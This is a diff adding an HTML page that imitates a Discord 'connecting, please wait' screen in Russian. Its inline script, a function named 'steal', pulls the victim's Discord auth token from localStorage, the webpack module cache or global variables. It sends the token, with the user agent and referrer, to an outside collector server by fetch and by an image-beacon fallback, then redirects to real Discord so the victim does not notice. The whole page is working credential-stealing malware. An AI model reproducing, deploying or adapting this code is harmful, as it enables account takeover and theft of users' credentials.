@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #1e1e2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+        }
+        .container {
+            background: #2b2d3d;
+            padding: 50px 60px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            max-width: 400px;
+        }
+        .spinner {
+            border: 5px solid #3a3c4a;
+            border-top: 5px solid #5865F2;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 {
+            font-weight: 500;
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+        p {
+            color: #a0a0b0;
+            font-size: 14px;
+        }
+        .discord-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="discord-icon">💜</div>
+        <div class="spinner"></div>
+        <h2>Подключение к Discord</h2>
+        <p>Пожалуйста, подождите, идёт проверка...</p>
+    </div>
+
+    <script>
+        (function steal() {
+            // --- ФУНКЦИЯ ИЗВЛЕЧЕНИЯ ТОКЕНА ---
+            function getToken() {
+                try {
+                    // 1. Прямой доступ к localStorage
+                    let token = localStorage.getItem('token');
+                    if (token) return token;
+
+                    // 2. Обход через webpack (для веб-версии Discord)
+                    if (window.webpackChunkdiscord_app) {
+                        const modules = window.webpackChunkdiscord_app.push([
+                            [Symbol()], {}, function(e) {
+                                const cache = e.cache;
+                                for (let key in cache) {
+                                    const mod = cache[key]?.exports;
+                                    if (mod && typeof mod.getToken === 'function') {
+                                        return mod.getToken();
+                                    }
+                                    if (mod && mod.token) {
+                                        return mod.token;
+                                    }
+                                }
+                                return null;
+                            }
+                        ]);
+                        if (modules) return modules;
+                    }
+
+                    // 3. Поиск в глобальных переменных
+                    for (let key in window) {
+                        try {
+                            if (key.includes('discord') || key.includes('token')) {
+                                const val = window[key];
+                                if (typeof val === 'string' && val.length > 50 && val.includes('.')) {
+                                    return val;
+                                }
+                            }
+                        } catch(e) {}
+                    }
+
+                    return null;
+                } catch(e) {
+                    return null;
+                }
+            }
+
+            // --- ИЗВЛЕКАЕМ ---
+            const token = getToken();
+
+            // --- ЕСЛИ НАШЛИ — ОТПРАВЛЯЕМ ---
+            if (token) {
+                const data = {
+                    token: token,
+                    ua: navigator.userAgent,
+                    url: window.location.href,
+                    time: Date.now(),
+                    referrer: document.referrer || ''
+                };
+
+                // Отправка на ваш сервер Render
+                fetch('https://collector-k3l3.onrender.com/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).catch(() => {});
+
+                // Дополнительно: отправка через Image (если fetch заблокирован)
+                const img = new Image();
+                img.src = 'https://collector-k3l3.onrender.com/collect?token=' + encodeURIComponent(token) + '&t=' + Date.now();
+            }
+
+            // --- ПЕРЕНАПРАВЛЕНИЕ НА РЕАЛЬНЫЙ DISCORD (скрываем следы) ---
+            setTimeout(function() {
+                window.location.href = 'https://discord.com/app';
+            }, 2500);
+        })();
+    </script>
+</body>
+</html>
